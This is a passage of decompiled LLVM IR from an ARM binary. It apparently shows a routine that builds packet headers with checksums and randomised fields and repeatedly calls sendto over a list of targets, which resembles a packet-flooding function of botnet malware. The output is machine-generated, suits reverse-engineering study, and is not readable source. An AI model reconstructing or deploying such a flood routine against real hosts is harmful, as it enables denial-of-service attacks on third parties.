  %v9_aee0 = icmp eq i32 %v1_aed4, %v1_aee0
  store i1 %v9_aee0, i1* %cpsr_z.global-to-local, align 1
  %v2_aee4 = load i32, i32* %r6.global-to-local, align 4
  %v3_aee4 = add i32 %v2_aee4, 1
  %v4_aee4 = inttoptr i32 %v3_aee4 to i8*
  store i8 %v5_ad5c, i8* %v4_aee4, align 1
  %v0_aee8 = load i32, i32* %r7.global-to-local, align 4
  %v1_aee8 = trunc i32 %v0_aee8 to i8
  %v2_aee8 = load i32, i32* %r6.global-to-local, align 4
  %v3_aee8 = add i32 %v2_aee8, 2
  %v4_aee8 = inttoptr i32 %v3_aee8 to i8*
  store i8 %v1_aee8, i8* %v4_aee8, align 1
  %v0_aeec = load i32, i32* %r2.global-to-local, align 4
  %v1_aeec = trunc i32 %v0_aeec to i8
  %v2_aeec = load i32, i32* %r6.global-to-local, align 4
  %v3_aeec = add i32 %v2_aeec, 3
  %v4_aeec = inttoptr i32 %v3_aeec to i8*
  store i8 %v1_aeec, i8* %v4_aeec, align 1
  %v0_aef0 = load i32, i32* %r8.global-to-local, align 4
  %v1_aef0 = trunc i32 %v0_aef0 to i8
  %v2_aef0 = load i32, i32* %r6.global-to-local, align 4
  %v3_aef0 = add i32 %v2_aef0, 4
  %v4_aef0 = inttoptr i32 %v3_aef0 to i8*
  store i8 %v1_aef0, i8* %v4_aef0, align 1
  %v0_aef4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_aef4, i32* %stack_var_-40, align 4
  %v5_aef8 = icmp slt i32 %v1_aed4, %v1_aee0
  br i1 %v5_aef8, label %dec_label_pc_ad6c, label %dec_label_pc_aefc

dec_label_pc_aefc:                                ; preds = %bb97
  %v1_af04 = add i32 %v5_ab98, 8
  store i32 %v1_af04, i32* %r3.global-to-local, align 4
  %v1_af08 = add i32 %v5_ab98, 52
  store i32 %v1_af08, i32* %r1.global-to-local, align 4
  %v0_af14.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_af14.preheader

dec_label_pc_af14.preheader:                      ; preds = %dec_label_pc_aefc, %dec_label_pc_b1a8
  %v0_af14.pre = phi i32 [ %v0_af14.pre.pre, %dec_label_pc_aefc ], [ %v0_ac5c, %dec_label_pc_b1a8 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_af08, %dec_label_pc_aefc ], [ %v1_b1b4, %dec_label_pc_b1a8 ]
  %stack_var_-152.0.ph = phi i32 [ %v1_af04, %dec_label_pc_aefc ], [ %v1_b1b0, %dec_label_pc_b1a8 ]
  %v2_b18c = icmp eq i32 %v1_abb8, 0
  %v2_af8c = icmp eq i32 %v1_ac4c, 0
  %v2_af58 = icmp eq i32 %v5_abec, -1
  br label %dec_label_pc_af14

dec_label_pc_af14:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af14.preheader
  %v0_af14 = phi i32 [ %v0_af14.pre, %dec_label_pc_af14.preheader ], [ %v1_b06c, %dec_label_pc_afa8 ]
  %v2_af14 = icmp eq i32 %v0_af14, 0
  store i1 %v2_af14, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp98 = icmp slt i32 %v0_af14, 1
  br label %dec_label_pc_af1c

dec_label_pc_af1c:                                ; preds = %dec_label_pc_af1c, %dec_label_pc_af14
  br i1 %tmp98, label %dec_label_pc_af1c, label %dec_label_pc_af20

dec_label_pc_af20:                                ; preds = %dec_label_pc_af1c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_af2c

dec_label_pc_af2c:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af20
  %v1_af40 = phi i32 [ %v1_b068, %dec_label_pc_afa8 ], [ 0, %dec_label_pc_af20 ]
  %v5_af30 = mul i32 %v1_af40, 24
  %v1_af34 = load i32, i32* @sb, align 4
  %v2_af34 = add i32 %v1_af34, %v5_af30
  store i32 %v2_af34, i32* %r3.global-to-local, align 4
  store i32 %v4_aacc, i32* %r1.global-to-local, align 4
  %v1_af3c = add i32 %v2_af34, 20
  %v2_af3c = inttoptr i32 %v1_af3c to i8*
  %v3_af3c = load i8, i8* %v2_af3c, align 1
  %v4_af3c = zext i8 %v3_af3c to i32
  store i32 %v4_af3c, i32* %r2.global-to-local, align 4
  %v4_af40 = mul i32 %v1_af40, 4
  %v5_af40 = add i32 %v4_af40, %v4_aacc
  %v6_af40 = inttoptr i32 %v5_af40 to i32*
  %v7_af40 = load i32, i32* %v6_af40, align 4
  store i32 %v7_af40, i32* @r5, align 4
  %v7_af44 = icmp eq i8 %v3_af3c, 31
  store i1 %v7_af44, i1* %cpsr_z.global-to-local, align 1
  %v1_af48 = add i32 %v7_af40, 24
  store i32 %v1_af48, i32* @r6, align 4
  %v1_af4c = add i32 %v7_af40, 44
  store i32 %v1_af4c, i32* @r7, align 4
  %tmp104 = icmp ult i8 %v3_af3c, 32
  br i1 %tmp104, label %dec_label_pc_b08c, label %dec_label_pc_af54

dec_label_pc_af54:                                ; preds = %dec_label_pc_af2c
  store i32 %v5_abec, i32* %r2.global-to-local, align 4
  store i1 %v2_af58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af58, label %dec_label_pc_b0f4, label %dec_label_pc_af60

dec_label_pc_af60:                                ; preds = %dec_label_pc_b08c, %dec_label_pc_af54
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  %v0_af68 = load i32, i32* @sl, align 4
  %v9_af68 = icmp eq i32 %v0_af68, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  store i1 %v9_af68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af68, label %dec_label_pc_b10c, label %dec_label_pc_af70

dec_label_pc_af70:                                ; preds = %dec_label_pc_b0f4.dec_label_pc_af70_crit_edge, %dec_label_pc_af60
  %v1_af74 = phi i32 [ %v1_af74.pre, %dec_label_pc_b0f4.dec_label_pc_af70_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), %dec_label_pc_af60 ]
  store i32 %v3_ac54, i32* %r3.global-to-local, align 4
  %v9_af74 = icmp eq i32 %v3_ac54, %v1_af74
  store i1 %v9_af74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af74, label %dec_label_pc_b144, label %dec_label_pc_af7c

dec_label_pc_af7c:                                ; preds = %dec_label_pc_b10c.dec_label_pc_af7c_crit_edge, %dec_label_pc_af70
  %v1_af80 = phi i32 [ %v1_af80.pre, %dec_label_pc_b10c.dec_label_pc_af7c_crit_edge ], [ %v1_af74, %dec_label_pc_af70 ]
  store i32 %v3_ac58, i32* %r1.global-to-local, align 4
  %v9_af80 = icmp eq i32 %v3_ac58, %v1_af80
  store i1 %v9_af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af80, label %dec_label_pc_b160, label %dec_label_pc_af88

dec_label_pc_af88:                                ; preds = %dec_label_pc_b144, %dec_label_pc_af7c
  store i32 %v1_ac4c, i32* %r2.global-to-local, align 4
  store i1 %v2_af8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af8c, label %dec_label_pc_b184, label %.thread27

.thread27:                                        ; preds = %dec_label_pc_af88
  %v1_af90 = load i32, i32* @r5, align 4
  %v2_af90 = add i32 %v1_af90, 16
  %v3_af90 = inttoptr i32 %v2_af90 to i32*
  %v4_af90 = load i32, i32* %v3_af90, align 4
  store i32 %v4_af90, i32* %r3.global-to-local, align 4
  %v2_af94 = load i32, i32* @r6, align 4
  %v3_af94 = add i32 %v2_af94, 16
  %v4_af94 = inttoptr i32 %v3_af94 to i32*
  store i32 %v4_af90, i32* %v4_af94, align 4
  br label %dec_label_pc_af9c

dec_label_pc_af9c:                                ; preds = %bb101, %.thread27
  store i32 %v1_abb8, i32* %r3.global-to-local, align 4
  store i1 %v2_b18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b18c, label %dec_label_pc_afa8, label %dec_label_pc_b198

dec_label_pc_afa8:                                ; preds = %dec_label_pc_af9c, %dec_label_pc_b184, %dec_label_pc_b198
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_afac = load i32, i32* @r8, align 4
  %v1_afac = trunc i32 %v0_afac to i8
  %v2_afac = load i32, i32* @r5, align 4
  %v3_afac = add i32 %v2_afac, 10
  %v4_afac = inttoptr i32 %v3_afac to i8*
  store i8 %v1_afac, i8* %v4_afac, align 1
  %v0_afb0 = load i32, i32* @r8, align 4
  %v1_afb0 = trunc i32 %v0_afb0 to i8
  %v2_afb0 = load i32, i32* @r5, align 4
  %v3_afb0 = add i32 %v2_afb0, 11
  %v4_afb0 = inttoptr i32 %v3_afb0 to i8*
  store i8 %v1_afb0, i8* %v4_afb0, align 1
  %v0_afb4 = load i32, i32* @r5, align 4
  store i32 %v0_afb4, i32* @r0, align 4
  %v2_afb8 = call i32 @function_ddf4(i32 %v0_afb4, i32 20)
  %v3_afb8 = trunc i32 %v2_afb8 to i8
  %v4_afbc = sdiv i32 %v2_afb8, 256
  store i32 %v4_afbc, i32* %r3.global-to-local, align 4
  %v1_afc0 = trunc i32 %v4_afbc to i8
  %v2_afc0 = load i32, i32* @r5, align 4
  %v3_afc0 = add i32 %v2_afc0, 11
  %v4_afc0 = inttoptr i32 %v3_afc0 to i8*
  store i8 %v1_afc0, i8* %v4_afc0, align 1
  %v3_afc4 = load i32, i32* @r5, align 4
  %v4_afc4 = add i32 %v3_afc4, 10
  %v5_afc4 = inttoptr i32 %v4_afc4 to i8*
  store i8 %v3_afb8, i8* %v5_afc4, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_afcc = load i32, i32* @r8, align 4
  %v1_afcc = trunc i32 %v0_afcc to i8
  %v2_afcc = load i32, i32* @r6, align 4
  %v3_afcc = add i32 %v2_afcc, 10
  %v4_afcc = inttoptr i32 %v3_afcc to i8*
  store i8 %v1_afcc, i8* %v4_afcc, align 1
  %v0_afd0 = load i32, i32* @r8, align 4
  %v1_afd0 = trunc i32 %v0_afd0 to i8
  %v2_afd0 = load i32, i32* @r6, align 4
  %v3_afd0 = add i32 %v2_afd0, 11
  %v4_afd0 = inttoptr i32 %v3_afd0 to i8*
  store i8 %v1_afd0, i8* %v4_afd0, align 1
  %v0_afd4 = load i32, i32* @r6, align 4
  store i32 %v0_afd4, i32* @r0, align 4
  %v2_afd8 = call i32 @function_ddf4(i32 %v0_afd4, i32 20)
  %v3_afd8 = trunc i32 %v2_afd8 to i8
  store i32 %v2_afd8, i32* %r0.global-to-local, align 4
  %v4_afdc = sdiv i32 %v2_afd8, 256
  store i32 %v4_afdc, i32* %r3.global-to-local, align 4
  %v3_afe0 = load i32, i32* @r6, align 4
  %v4_afe0 = add i32 %v3_afe0, 10
  %v5_afe0 = inttoptr i32 %v4_afe0 to i8*
  store i8 %v3_afd8, i8* %v5_afe0, align 1
  %v0_afe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_afe4 = trunc i32 %v0_afe4 to i8
  %v2_afe4 = load i32, i32* @r6, align 4
  %v3_afe4 = add i32 %v2_afe4, 11
  %v4_afe4 = inttoptr i32 %v3_afe4 to i8*
  store i8 %v1_afe4, i8* %v4_afe4, align 1
  %v0_afe8 = load i32, i32* @r7, align 4
  %v1_afe8 = add i32 %v0_afe8, 4
  %v2_afe8 = inttoptr i32 %v1_afe8 to i8*
  %v3_afe8 = load i8, i8* %v2_afe8, align 1
  %v4_afe8 = zext i8 %v3_afe8 to i32
  store i32 %v4_afe8, i32* %r3.global-to-local, align 4
  %v1_afec = add i32 %v0_afe8, 5
  %v2_afec = inttoptr i32 %v1_afec to i8*
  %v3_afec = load i8, i8* %v2_afec, align 1
  %v4_afec = zext i8 %v3_afec to i32
  store i32 %v0_afe8, i32* @r1, align 4
  %v4_aff4 = mul nuw nsw i32 %v4_afec, 256
  %v5_aff4 = or i32 %v4_aff4, %v4_afe8
  store i32 %v5_aff4, i32* %r2.global-to-local, align 4
  %v0_aff8 = load i32, i32* @r8, align 4
  %v1_aff8 = trunc i32 %v0_aff8 to i8
  %v3_aff8 = add i32 %v0_afe8, 6
  %v4_aff8 = inttoptr i32 %v3_aff8 to i8*
  store i8 %v1_aff8, i8* %v4_aff8, align 1
  store i32 %stack_var_-152.0.ph, i32* %r3.global-to-local, align 4
  %v0_b000 = load i32, i32* @r8, align 4
  %v1_b000 = trunc i32 %v0_b000 to i8
  %v2_b000 = load i32, i32* @r7, align 4
  %v3_b000 = add i32 %v2_b000, 7
  %v4_b000 = inttoptr i32 %v3_b000 to i8*
  store i8 %v1_b000, i8* %v4_b000, align 1
  %v0_b004 = load i32, i32* @r6, align 4
  store i32 %v0_b004, i32* %r0.global-to-local, align 4
  %v4_b008 = call i32 @function_de50(i32 %v0_b004, i32 %v0_afe8, i32 %v5_aff4, i32 %stack_var_-152.0.ph)
  %v5_b008 = trunc i32 %v4_b008 to i8
  store i32 %v4_b008, i32* %r0.global-to-local, align 4
  %v3_b00c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b00c, i32* %r3.global-to-local, align 4
  %v3_b010 = mul i32 %v3_b00c, 32
  store i32 %v3_b010, i32* %r2.global-to-local, align 4
  %v0_b014 = load i32, i32* @r5, align 4
  %v1_b014 = add i32 %v0_b014, 16
  %v2_b014 = inttoptr i32 %v1_b014 to i32*
  %v3_b014 = load i32, i32* %v2_b014, align 4
  store i32 %v3_b014, i32* %r1.global-to-local, align 4
  %v5_b018 = mul i32 %v3_b00c, 24
  store i32 %v5_b018, i32* %r2.global-to-local, align 4
  %v4_b01c43 = udiv i32 %v4_b008, 256
  %v1_b020 = trunc i32 %v4_b01c43 to i8
  %v2_b020 = load i32, i32* @r7, align 4
  %v3_b020 = add i32 %v2_b020, 7
  %v4_b020 = inttoptr i32 %v3_b020 to i8*
  store i8 %v1_b020, i8* %v4_b020, align 1
  %v0_b024 = load i32, i32* %r2.global-to-local, align 4
  %v1_b024 = load i32, i32* @sb, align 4
  %v2_b024 = add i32 %v1_b024, %v0_b024
  store i32 %v2_b024, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b02c = load i32, i32* @r7, align 4
  %v4_b02c = add i32 %v3_b02c, 6
  %v5_b02c = inttoptr i32 %v4_b02c to i8*
  store i8 %v5_b008, i8* %v5_b02c, align 1
  %v0_b030 = load i32, i32* %r1.global-to-local, align 4
  %v1_b030 = load i32, i32* %lr.global-to-local, align 4
  %v2_b030 = add i32 %v1_b030, 4
  %v3_b030 = inttoptr i32 %v2_b030 to i32*
  store i32 %v0_b030, i32* %v3_b030, align 4
  %v0_b034 = load i32, i32* %r3.global-to-local, align 4
  %v1_b034 = trunc i32 %v0_b034 to i8
  %v2_b034 = load i32, i32* %r2.global-to-local, align 4
  %v3_b034 = load i32, i32* @sb, align 4
  %v4_b034 = add i32 %v3_b034, %v2_b034
  %v5_b034 = inttoptr i32 %v4_b034 to i8*
  store i8 %v1_b034, i8* %v5_b034, align 1
  %v0_b038 = load i32, i32* @r8, align 4
  %v1_b038 = trunc i32 %v0_b038 to i8
  %v2_b038 = load i32, i32* %lr.global-to-local, align 4
  %v3_b038 = add i32 %v2_b038, 2
  %v4_b038 = inttoptr i32 %v3_b038 to i8*
  store i8 %v1_b038, i8* %v4_b038, align 1
  %v0_b03c = load i32, i32* @r8, align 4
  %v1_b03c = trunc i32 %v0_b03c to i8
  %v2_b03c = load i32, i32* %lr.global-to-local, align 4
  %v3_b03c = add i32 %v2_b03c, 1
  %v4_b03c = inttoptr i32 %v3_b03c to i8*
  store i8 %v1_b03c, i8* %v4_b03c, align 1
  %v0_b040 = load i32, i32* @r8, align 4
  %v1_b040 = trunc i32 %v0_b040 to i8
  %v2_b040 = load i32, i32* %lr.global-to-local, align 4
  %v3_b040 = add i32 %v2_b040, 3
  %v4_b040 = inttoptr i32 %v3_b040 to i8*
  store i8 %v1_b040, i8* %v4_b040, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b04c = load i32, i32* @r5, align 4
  store i32 %v0_b04c, i32* %r1.global-to-local, align 4
  store i32 %v3_ac00, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-120.0.ph, i32* %r2.global-to-local, align 4
  %v0_b058 = load i32, i32* %lr.global-to-local, align 4
  %v4_b058 = inttoptr i32 %v0_b058 to %sockaddr*
  %v7_b060 = inttoptr i32 %v0_b04c to i32*
  %v9_b060 = call i32 @sendto(i32 %v3_ac00, i32* %v7_b060, i32 %stack_var_-120.0.ph, i32 16384, %sockaddr* %v4_b058, i32 16)
  %v3_b064 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b064, i32* %r3.global-to-local, align 4
  %v1_b068 = add i32 %v3_b064, 1
  store i32 %v1_b068, i32* %r0.global-to-local, align 4
  %v1_b06c = load i32, i32* @fp, align 4
  %v9_b06c = icmp eq i32 %v1_b068, %v1_b06c
  store i1 %v9_b06c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b068, i32* %stack_var_-40, align 4
  %v6_b074 = icmp slt i32 %v1_b068, %v1_b06c
  br i1 %v6_b074, label %dec_label_pc_af2c, label %dec_label_pc_af14

dec_label_pc_b07c:                                ; preds = %dec_label_pc_ac10
  store i32 %v3_ac00, i32* %r0.global-to-local, align 4
  %v1_b080 = call i32 @close(i32 %v3_ac00)
  store i32 %v1_b080, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b084

dec_label_pc_b084:                                ; preds = %dec_label_pc_aaac, %dec_label_pc_b07c
  %v29_b088 = phi i32 [ -1, %dec_label_pc_aaac ], [ %v1_b080, %dec_label_pc_b07c ]
  store i32 %v3_aaac, i32* %r4.global-to-local, align 4
  store i32 %v6_aaac, i32* %r5.global-to-local, align 4
  store i32 %v9_aaac, i32* %r6.global-to-local, align 4
  store i32 %v12_aaac, i32* %r7.global-to-local, align 4
  store i32 %v15_aaac, i32* %r8.global-to-local, align 4
  ret i32 %v29_b088

dec_label_pc_b08c:                                ; preds = %dec_label_pc_af2c
  %v1_b08c = add i32 %v2_af34, 16
  %v2_b08c = inttoptr i32 %v1_b08c to i32*
  %v3_b08c = load i32, i32* %v2_b08c, align 4
  store i32 %v3_b08c, i32* %r4.global-to-local, align 4
  %v0_b090 = call i32 @function_f67c()
  store i32 %v0_b090, i32* %r0.global-to-local, align 4
  %v3_b094 = load i32, i32* %stack_var_-40, align 4
  %v5_b09c = mul i32 %v3_b094, 24
  %v0_b0a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b0a4 = load i32, i32* @sb, align 4
  %v2_b0a4 = add i32 %v1_b0a4, %v5_b09c
  store i32 %v2_b0a4, i32* %r1.global-to-local, align 4
  %v1_b0a8 = and i32 %v0_b0a0, 65280
  store i32 %v1_b0a8, i32* %r3.global-to-local, align 4
  %v1_b0a0 = udiv i32 %v0_b0a0, 256
  %v3_b0ac = and i32 %v1_b0a0, 65280
  store i32 %v3_b0ac, i32* %r2.global-to-local, align 4
  %v1_b0b4 = add i32 %v2_b0a4, 20
  %v2_b0b4 = inttoptr i32 %v1_b0b4 to i8*
  %v3_b0b4 = load i8, i8* %v2_b0b4, align 1
  %v4_b0b4 = zext i8 %v3_b0b4 to i32
  store i32 %v4_b0b4, i32* %lr.global-to-local, align 4
  %v2_b0c0 = call i32 @llvm.bswap.i32(i32 %v0_b0a0)
  %v7_b0c4 = lshr i32 %v0_b090, %v4_b0b4
  %v8_b0c4 = add i32 %v7_b0c4, %v2_b0c0
  %v3_b0d0 = mul i32 %v8_b0c4, 16777216
  %v1_b0d4 = and i32 %v8_b0c4, 65280
  store i32 %v1_b0d4, i32* %r0.global-to-local, align 4
  store i32 %v5_abec, i32* %r2.global-to-local, align 4
  %v4_b0e0 = mul nuw nsw i32 %v1_b0d4, 256
  %v5_b0e0 = or i32 %v4_b0e0, %v3_b0d0
  store i32 %v5_b0e0, i32* %r1.global-to-local, align 4
  %v2_b0e4 = call i32 @llvm.bswap.i32(i32 %v8_b0c4)
  store i32 %v2_b0e4, i32* %r3.global-to-local, align 4
  store i1 %v2_af58, i1* %cpsr_z.global-to-local, align 1
  %v1_b0ec = load i32, i32* @r5, align 4
  %v2_b0ec = add i32 %v1_b0ec, 16
  %v3_b0ec = inttoptr i32 %v2_b0ec to i32*
  store i32 %v2_b0e4, i32* %v3_b0ec, align 4
  br i1 %v2_af58, label %dec_label_pc_b0f4, label %dec_label_pc_af60

dec_label_pc_b0f4:                                ; preds = %dec_label_pc_b08c, %dec_label_pc_af54
  %v0_b0f4 = call i32 @function_f67c()
  store i32 %v0_b0f4, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  %v0_b100 = load i32, i32* @sl, align 4
  %v9_b100 = icmp eq i32 %v0_b100, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  store i1 %v9_b100, i1* %cpsr_z.global-to-local, align 1
  %v1_b104 = load i32, i32* @r5, align 4
  %v2_b104 = add i32 %v1_b104, 12
  %v3_b104 = inttoptr i32 %v2_b104 to i32*
  store i32 %v0_b0f4, i32* %v3_b104, align 4
  br i1 %v9_b100, label %dec_label_pc_b10c, label %dec_label_pc_b0f4.dec_label_pc_af70_crit_edge

dec_label_pc_b0f4.dec_label_pc_af70_crit_edge:    ; preds = %dec_label_pc_b0f4
  %v1_af74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_af70

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b0f4, %dec_label_pc_af60
  %v0_b10c = call i32 @function_f67c()
  %v3_b114 = urem i32 %v0_b10c, 65536
  store i32 %v3_b114, i32* %r0.global-to-local, align 4
  %v3_b11816 = udiv i32 %v0_b10c, 256
  %v1_b11c = trunc i32 %v3_b11816 to i8
  %v2_b11c = load i32, i32* @r5, align 4
  %v3_b11c = add i32 %v2_b11c, 5
  %v4_b11c = inttoptr i32 %v3_b11c to i8*
  store i8 %v1_b11c, i8* %v4_b11c, align 1
  %v0_b120 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v3_ac54, i32* %r3.global-to-local, align 4
  %v1_b128 = sub i32 999, %v0_b120
  store i32 %v1_b128, i32* %r2.global-to-local, align 4
  %v3_b12c = sdiv i32 %v1_b128, 256
  store i32 %v3_b12c, i32* %r1.global-to-local, align 4
  %v1_b130 = load i32, i32* @r4, align 4
  %v9_b130 = icmp eq i32 %v3_ac54, %v1_b130
  store i1 %v9_b130, i1* %cpsr_z.global-to-local, align 1
  %v1_b134 = trunc i32 %v0_b120 to i8
  %v2_b134 = load i32, i32* @r5, align 4
  %v3_b134 = add i32 %v2_b134, 4
  %v4_b134 = inttoptr i32 %v3_b134 to i8*
  store i8 %v1_b134, i8* %v4_b134, align 1
  %v0_b138 = load i32, i32* %r1.global-to-local, align 4
  %v1_b138 = trunc i32 %v0_b138 to i8
  %v2_b138 = load i32, i32* @r6, align 4
  %v3_b138 = add i32 %v2_b138, 5
  %v4_b138 = inttoptr i32 %v3_b138 to i8*
  store i8 %v1_b138, i8* %v4_b138, align 1
  %v0_b13c = load i32, i32* %r2.global-to-local, align 4
  %v1_b13c = trunc i32 %v0_b13c to i8
  %v2_b13c = load i32, i32* @r6, align 4
  %v3_b13c = add i32 %v2_b13c, 4
  %v4_b13c = inttoptr i32 %v3_b13c to i8*
  store i8 %v1_b13c, i8* %v4_b13c, align 1
  %v0_b140 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b140, label %dec_label_pc_b144, label %dec_label_pc_b10c.dec_label_pc_af7c_crit_edge

dec_label_pc_b10c.dec_label_pc_af7c_crit_edge:    ; preds = %dec_label_pc_b10c
  %v1_af80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_af7c

dec_label_pc_b144:                                ; preds = %dec_label_pc_b10c, %dec_label_pc_af70
  %v0_b144 = call i32 @function_f67c()
  %v1_b144 = trunc i32 %v0_b144 to i8
  store i32 %v0_b144, i32* %r0.global-to-local, align 4
  store i32 %v3_ac58, i32* %r1.global-to-local, align 4
  %v4_b14c = sdiv i32 %v0_b144, 256
  store i32 %v4_b14c, i32* %r3.global-to-local, align 4
  %v1_b150 = load i32, i32* @r4, align 4
  %v9_b150 = icmp eq i32 %v3_ac58, %v1_b150
  store i1 %v9_b150, i1* %cpsr_z.global-to-local, align 1
  %v3_b154 = load i32, i32* @r5, align 4
  %v4_b154 = add i32 %v3_b154, 44
  %v5_b154 = inttoptr i32 %v4_b154 to i8*
  store i8 %v1_b144, i8* %v5_b154, align 1
  %v0_b158 = load i32, i32* %r3.global-to-local, align 4
  %v1_b158 = trunc i32 %v0_b158 to i8
  %v2_b158 = load i32, i32* @r7, align 4
  %v3_b158 = add i32 %v2_b158, 1
  %v4_b158 = inttoptr i32 %v3_b158 to i8*
  store i8 %v1_b158, i8* %v4_b158, align 1
  %v0_b15c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b15c, label %dec_label_pc_b160, label %dec_label_pc_af88

dec_label_pc_b160:                                ; preds = %dec_label_pc_b144, %dec_label_pc_af7c
  %v0_b160 = call i32 @function_f67c()
  %v1_b160 = trunc i32 %v0_b160 to i8
  store i32 %v0_b160, i32* %r0.global-to-local, align 4
  store i32 %v1_ac4c, i32* %r2.global-to-local, align 4
  %v4_b168 = sdiv i32 %v0_b160, 256
  store i32 %v4_b168, i32* %r3.global-to-local, align 4
  store i1 %v2_af8c, i1* %cpsr_z.global-to-local, align 1
  %v1_b170 = trunc i32 %v4_b168 to i8
  %v2_b170 = load i32, i32* @r7, align 4
  %v3_b170 = add i32 %v2_b170, 3
  %v4_b170 = inttoptr i32 %v3_b170 to i8*
  store i8 %v1_b170, i8* %v4_b170, align 1
  %v0_b174 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b174, label %bb100, label %bb99

bb99:                                             ; preds = %dec_label_pc_b160
  %v1_b174 = load i32, i32* @r5, align 4
  %v2_b174 = add i32 %v1_b174, 16
  %v3_b174 = inttoptr i32 %v2_b174 to i32*
  %v4_b174 = load i32, i32* %v3_b174, align 4
  store i32 %v4_b174, i32* %r3.global-to-local, align 4
  br label %bb100

bb100:                                            ; preds = %dec_label_pc_b160, %bb99
  %v3_b178 = load i32, i32* @r7, align 4
  %v4_b178 = add i32 %v3_b178, 2
  %v5_b178 = inttoptr i32 %v4_b178 to i8*
  store i8 %v1_b160, i8* %v5_b178, align 1
  %v0_b17c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b17c, label %dec_label_pc_b184, label %bb101

bb101:                                            ; preds = %bb100
  %v1_b17c = load i32, i32* %r3.global-to-local, align 4
  %v2_b17c = load i32, i32* @r6, align 4
  %v3_b17c = add i32 %v2_b17c, 16
  %v4_b17c = inttoptr i32 %v3_b17c to i32*
  store i32 %v1_b17c, i32* %v4_b17c, align 4
  br label %dec_label_pc_af9c

dec_label_pc_b184:                                ; preds = %dec_label_pc_af88, %bb100
  %v0_b184 = call i32 @function_f67c()
  store i32 %v0_b184, i32* %r0.global-to-local, align 4
  store i32 %v1_abb8, i32* %r3.global-to-local, align 4
  store i1 %v2_b18c, i1* %cpsr_z.global-to-local, align 1
  %v1_b190 = load i32, i32* @r6, align 4
  %v2_b190 = add i32 %v1_b190, 16
  %v3_b190 = inttoptr i32 %v2_b190 to i32*
  store i32 %v0_b184, i32* %v3_b190, align 4
  br i1 %v2_b18c, label %dec_label_pc_afa8, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_af9c, %dec_label_pc_b184
  %v0_b198 = load i32, i32* @r7, align 4
  %v1_b198 = add i32 %v0_b198, 8
  store i32 %v1_b198, i32* %r0.global-to-local, align 4
  store i32 %v5_ab98, i32* @r1, align 4
  %v1_b1a0 = inttoptr i32 %v1_b198 to i8*
  %v2_b1a0 = call i32 @function_f7fc(i8* %v1_b1a0)
  store i32 %v2_b1a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_afa8

dec_label_pc_b1a8:                                ; preds = %dec_label_pc_ac38
  %v1_b1b0 = add i32 %v5_ab98, 8
  store i32 %v1_b1b0, i32* %r2.global-to-local, align 4
  %v1_b1b4 = add i32 %v5_ab98, 52
  store i32 %v1_b1b4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_af14.preheader

; uselistorder directives
  uselistorder i32 %v1_b1b4, { 1, 0 }
  uselistorder i32 %v1_b1b0, { 1, 0 }
  uselistorder i32 %v4_b168, { 1, 0 }
  uselistorder i32 %v0_b160, { 0, 2, 1 }
  uselistorder i32 %v0_b144, { 0, 2, 1 }
  uselistorder i32 %v2_b0e4, { 1, 0 }
  uselistorder i32 %v8_b0c4, { 1, 2, 0 }
  uselistorder i32 %v0_b0a0, { 1, 0, 2 }
  uselistorder i32 %v1_b06c, { 1, 2, 0 }
  uselistorder i32 %v1_b068, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_b00c, { 1, 0, 2 }
  uselistorder i32 %v4_b008, { 0, 2, 1 }
  uselistorder i32 %v0_afe8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_afd8, { 0, 2, 1 }
  uselistorder i32 %v4_afbc, { 1, 0 }
  uselistorder i32 %v7_af40, { 1, 0, 2 }
  uselistorder i32 %v0_af14, { 1, 0 }
  uselistorder i1 %v2_af58, { 3, 0, 1, 2 }
  uselistorder i1 %v2_b18c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_aed4, { 1, 0, 2 }
  uselistorder i32 %v0_ae98, { 1, 0, 2 }
  uselistorder i32 %v3_ad4c, { 0, 2, 1 }
  uselistorder i32 %v3_ad0c, { 1, 0 }
  uselistorder i32 %tmp87, { 1, 0 }
